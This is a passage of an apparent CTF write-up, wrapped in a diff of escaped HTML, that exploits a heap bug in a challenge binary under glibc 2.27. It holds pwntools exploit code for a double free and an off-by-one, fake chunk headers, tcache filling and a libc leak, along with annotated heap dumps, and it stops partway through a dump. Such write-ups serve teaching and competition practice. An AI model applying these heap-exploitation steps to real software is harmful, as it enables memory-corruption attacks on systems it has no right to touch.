+      puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Adding to your inventory..&amp;#34;&lt;/span&gt;);
+      chungus_weapon &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; size;
+      v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; malloc(size);
+      qword_202068 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)v0;
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+    {
+      LODWORD(v0) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] This is not possible..&amp;#34;&lt;/span&gt;);
+    }
+  }
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)v0;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h1&gt;
+&lt;h2 id=&#34;what-we-have&#34;&gt;What we have&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;An off-by-one when we create a new chunk&lt;/li&gt;
+&lt;li&gt;Double free by calling &lt;code&gt;fix&lt;/code&gt; and then providing an invalid size.&lt;/li&gt;
+&lt;li&gt;Trivial read after free thanks to the double free.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;restrictions&#34;&gt;Restrictions&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;The program does not use &lt;code&gt;printf&lt;/code&gt; with a format specifer, then we cannot do a &lt;a href=&#34;https://maxwelldulin.com/BlogPost?post=3107454976&#34;&gt;House of husk&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;We can only allocate &lt;code&gt;15&lt;/code&gt; chunks.&lt;/li&gt;
+&lt;li&gt;All the allocations except the big one are made using &lt;code&gt;calloc&lt;/code&gt;, even if it can be easily bypassed by adding the &lt;code&gt;IS_MAPPED&lt;/code&gt; flag to the chunk header to avoid zero-ing.&lt;/li&gt;
+&lt;li&gt;The libc version (&lt;code&gt;2.27&lt;/code&gt;) mitigates a few techniques, especially the &lt;a href=&#34;https://1ce0ear.github.io/2017/11/26/study-house-of-orange/&#34;&gt;House of Orange&lt;/a&gt; and introduces the &lt;code&gt;tcache&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Allocations have to fit in only two fastbins (&lt;code&gt;0x30&lt;/code&gt; / &lt;code&gt;0x40&lt;/code&gt;), which means we cannot get an arbitrary with a &lt;code&gt;fastbin dup&lt;/code&gt; technique due to the size of most of interesting memory areas in the libc (&lt;code&gt;0x7f&lt;/code&gt; =&amp;gt; &lt;code&gt;0x70&lt;/code&gt; fastbin against &lt;code&gt;0x30&lt;/code&gt; / &lt;code&gt;0x40&lt;/code&gt; in our case).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;how-to-leak-libc-&#34;&gt;How to leak libc ?&lt;/h2&gt;
+&lt;p&gt;Partial overwrites are as far as I know very hard to get because of &lt;code&gt;calloc&lt;/code&gt;. The first thing to do is to leak libc addresses to then target libc global variables / structures. The classic way to get a libc leak is to free a chunk that belongs to the unsorted bin and then print it. But as seen previously, we cannot allocate a large chunks that would end up in the unsorted bin. To do so we have to use the off-by-one bug to overwrite the next chunk&amp;rsquo;s size field with a bigger one that would correspond to the unsorted bin (&lt;code&gt;&amp;gt;= 0x90&lt;/code&gt;). We can edit the size of the second chunk from &lt;code&gt;0x30&lt;/code&gt; to &lt;code&gt;0xb0&lt;/code&gt; by doing:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;(idx, size, data, hang&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;):
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;)
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Choose an index: &amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;How much space do you need for it: &amp;#34;&lt;/span&gt;, str(size)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; hang &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
+
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input your weapon&amp;#39;s details: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, data)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;freexalloc&lt;/span&gt;(idx, size, data, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;):
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;)
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Choose an index: &amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;How much space do you need for this repair: &amp;#34;&lt;/span&gt;, str(size)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; doubleFree:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
+
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input your weapon&amp;#39;s details: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, data)
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;show&lt;/span&gt;(idx):
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;)
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Choose an index: &amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;allochuge&lt;/span&gt;(size):
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt;)
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;How much space do you need for this massive weapon: &amp;#34;&lt;/span&gt;, str(size)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# get libc leak&lt;/span&gt;
+
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;)
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;B&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;)
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# size&lt;/span&gt;
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;D&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;))
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;E&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;)
+
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x21&lt;/span&gt;)) &lt;span style=&#34;color:#75715e&#34;&gt;# barrier&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# freexalloc(5, 560, b&amp;#34;&amp;#34;, doubleFree=True)&lt;/span&gt;
+
+freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
+freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
+freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
+
+freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# fake unsorted chunk&lt;/span&gt;
+
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608560:	0x0000000000000000	0x0000000000000041 [0]
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608570:	0x00005555556085a0	0x4141414141414141
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608580:	0x4141414141414141	0x4141414141414141
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608590:	0x4141414141414141	0x4141414141414141
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085a0:	0x0a41414141414141	0x0000000000000041 [1]
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085b0:	0x0000000000000000	0x0000000000000000
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085c0:	0x0000000000000000	0x0000000000000000
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085d0:	0x0000000000000000	0x0000000000000000
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085e0:	0x0000000000000000	0x00000000000000b1 [2] &amp;lt;- Fake size | PREV_INUSE (1)
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085f0:	0x0000000000000000	0x4343434343434343	 
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608600:	0x4343434343434343	0x4343434343434343	 
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608610:	0x0a43434343434343	0x0000000000000041 [3]	 
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608620:	0x4444444444444444	0x4444444444444444	 
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608630:	0x000000000000000a	0x0000000000000000
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608640:	0x0000000000000000	0x0000000000000000	 
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608650:	0x0000000000000000	0x0000000000000031 [4]	 
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608660:	0x4545454545454545	0x4545454545454545	 
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608670:	0x4545454545454545	0x4545454545454545	 
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608680:	0x0a45454545454545	0x0000000000000031 [10]	 
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608690:	0x0000000000000000	0x0000000000000021 &amp;lt;- Fake chunk header 
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556086a0:	0x000000000000000a	0x0000000000000000
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556086b0:	0x0000000000000000	0x0000000000020951 &amp;lt;- Top chunk
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;fastbins
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x30: 0x5555556085e0 ◂— 0x0
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We allocate 6 chunks, we do need of 6 chunks because of the fake size we write on &lt;code&gt;chunk_2&lt;/code&gt; (&lt;code&gt;&amp;amp;chunk_2&lt;/code&gt; + &lt;code&gt;0xb0&lt;/code&gt; = &lt;code&gt;0x555555608690&lt;/code&gt;, in the last chunk near the top chunk). In the same way we craft a fake header in the body of the last chunk to avoid issues during the release of &lt;code&gt;chunk_2&lt;/code&gt;. If you&amp;rsquo;re not familiar with the security checks done by &lt;code&gt;malloc&lt;/code&gt; and &lt;code&gt;free&lt;/code&gt;, I would advise you to take a look at &lt;a href=&#34;https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks&#34;&gt;this resource&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Now that &lt;code&gt;chunk_2&lt;/code&gt; has been tampered with a fake &lt;code&gt;0xb0&lt;/code&gt; size, we just have to free it 8 times (to fill the tcache) to put it in the unsorted bin:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
+freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
+freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
+freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
+freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
+freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
+freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
+
+freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
+&lt;span style=&#34;color:#75715e&#34;&gt;# falls into the unsortedbin&lt;/span&gt;
+
+show(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
+
+libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3ebca0&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# offset of the unsorted bin&lt;/span&gt;
+
+stdin &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3eba00&lt;/span&gt;
+pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;libc: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(libc)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608560:	0x0000000000000000	0x0000000000000041
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608570:	0x00005555556085a0	0x4141414141414141
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608580:	0x4141414141414141	0x4141414141414141
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608590:	0x4141414141414141	0x4141414141414141
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085a0:	0x0a41414141414141	0x0000000000000041
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085b0:	0x0000000000000000	0x0000000000000000
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085c0:	0x0000000000000000	0x0000000000000000
